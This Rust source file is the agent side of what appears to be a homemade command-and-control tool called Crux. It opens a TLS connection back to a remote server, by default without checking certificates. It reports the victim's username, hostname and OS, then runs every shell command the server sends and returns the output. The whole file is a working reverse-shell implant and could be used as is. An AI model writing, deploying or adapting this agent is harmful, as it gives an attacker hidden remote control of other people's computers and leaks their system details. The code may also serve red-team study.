mod args;
#[path = "../utils/mod.rs"]
mod utils;

// crates
use native_tls::{TlsConnector, TlsStream};
use clap::error::Result;
use clap::{Parser};
use whoami::{self, fallible};
use serde_json;
use subprocess::{Exec, ExitStatus, Redirection};
use regex::Regex;

// std
use std::env;
use std::net::{TcpStream};
use std::collections::HashMap;

// My stuff
use args::CruxAgentArgs;
use utils::os::{Metadata, os_detect};
use utils::network::write_length_prefix;
use utils::data::{CmdType, Cmd, CmdResult};
use crate::utils::network::read_length_prefix;

fn send_metadata(stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Prepare Metadata
    let metadata = Metadata {
        username: whoami::username(),
        hostname: fallible::hostname().map_or("UNKNOWN_HOSTNAME".to_string(),|d| d),
        os_type: os_detect()
    };
    let metadata_serial = serde_json::to_string(&metadata)?;

    // Send metadata back to CruxServer
    let _ = write_length_prefix(stream, &metadata_serial.as_bytes());
    Ok(())
}

fn send_response(cmd_result: &CmdResult, stream: &mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
    // Serialize CmdResult
    let result_str = serde_json::to_string(cmd_result)?;
    write_length_prefix(stream, result_str.as_bytes())?;
    Ok(())
}

fn normalize_exit_code(status: ExitStatus) -> i64 {
    match status {
        ExitStatus::Exited(code) => code.into(),
        ExitStatus::Signaled(sig) => <u8 as Into<i64>>::into(sig)*-1,
        ExitStatus::Other(code) => code.into(),
        ExitStatus::Undetermined => -1,
    }
}
fn parse_var_def(def_str: &str) -> Result<(String, String), Box<dyn std::error::Error>> {
    let mut split_by_equal = def_str.splitn(2, '=');
    let var_name = match split_by_equal.next(){
        Some(var_name) => var_name.to_string(),
        _none => return Err("No variable name specified".into())
    };
    let mut var_value = match split_by_equal.next(){
        Some(var_value) => var_value.to_string(),
        _none => return Err("No variable value specified".into())
    };

    // Check for Strings in the value
    if var_value.starts_with('\'') && var_value.ends_with('\'') {
        var_value.remove(0);
        var_value.pop();
    }
    else if var_value.starts_with('"') && var_value.ends_with('"') {
        // TODO: Character Escaping
        // TODO: variable resolution
        var_value.remove(0);
        var_value.pop();
    }
    return Ok((var_name, var_value));
}

fn variable_substitution(command: &str, var_map: &HashMap<String, String>) -> String {
    // Regex to match either $VAR or ${VAR}
    let re = Regex::new(r"\$(?:\{(\w+)\}|(\w+))").unwrap();

    let result = re.replace_all(command, |caps: &regex::Captures| {
        // Extract variable name from either capture group
        let var_name = caps.get(1).or_else(|| caps.get(2)).unwrap().as_str();

        // Lookup value from var_map first, then environment, fallback empty string
        var_map
            .get(var_name)
            .cloned()
            .unwrap_or(format!("${}", var_name))
    });

    result.to_string()
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = CruxAgentArgs::parse();

    // Connect to CruxServer via TLS
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(!args.verify_cert)
        .build().unwrap();

    let ip_str = format!("{}:{}", args.rhost, args.rport);
    let stream = TcpStream::connect(ip_str)?;
    let mut stream = connector.connect(&args.rhost.to_string(), stream)?;

    send_metadata(&mut stream)?;

    // Set User environment variable
    let user = whoami::username();
    unsafe {
        env::set_var("USER", &user);
    }

    // Hash map for shell variables
    // Look out for concurrency safety issues potentially
    let mut shell_var_map: HashMap<String, String> = HashMap::new();

    loop {
        let received_cmd_vec = match read_length_prefix(&mut stream){
            Ok(c) => c,
            Err(_) => continue
        };

        let received_cmd: Cmd = match serde_json::from_slice(&received_cmd_vec) {
            Ok(c) => c,
            Err(_) => continue
        };

        let mut cmd_result = CmdResult::default();
        match received_cmd.cmd_type {
            CmdType::Exit =>{
                break
            }
            CmdType::Cd =>{
                let new_dir = match received_cmd.args.as_str() {
                    "" => env::var("HOME").unwrap_or("/".to_string()), // Home directory
                    _ => received_cmd.args
                };
                match env::set_current_dir(new_dir) {
                    Ok(_) => {
                        cmd_result.status = 0;
                    }
                    Err(e) => {
                        cmd_result.output = e.to_string();
                    }
                };
            }
            CmdType::Setvar =>{
                match parse_var_def(&received_cmd.args) {
                    Ok(var_tuple) => {
                        shell_var_map.insert(var_tuple.0, var_tuple.1);
                        cmd_result.status = 0;
                    }
                    Err(e) => {
                        cmd_result.output = e.to_string();
                    }
                };
            }
            CmdType::Export =>{
                match parse_var_def(&received_cmd.args) {
                    Ok(var_tuple) => {
                        unsafe {
                            env::set_var(var_tuple.0, var_tuple.1);
                        }
                        cmd_result.status = 0;
                    }
                    Err(e) => {
                        cmd_result.output = e.to_string();
                    }
                };
            }
            CmdType::Exec => {
                let subsituted_args = variable_substitution(&received_cmd.args, &shell_var_map);

                let execution = Exec::shell(subsituted_args)
                    .stdout(Redirection::Pipe)
                    .stderr(Redirection::Merge);

                match execution.capture(){
                    Ok(output) => {
                    cmd_result = CmdResult {
                            status: normalize_exit_code(output.exit_status),
                            output: output.stdout_str()
                        };
                    }
                    Err(_) => {
                        cmd_result.output = "Failed to run command".to_string();
                    }
                }
            }
            _ => {}
        }
        if let Err(_) = send_response(&mut cmd_result, &mut stream){
            // TODO: Introduce some error handling here???
            break;
        }
    }
    stream.shutdown()?;
    Ok(())
}
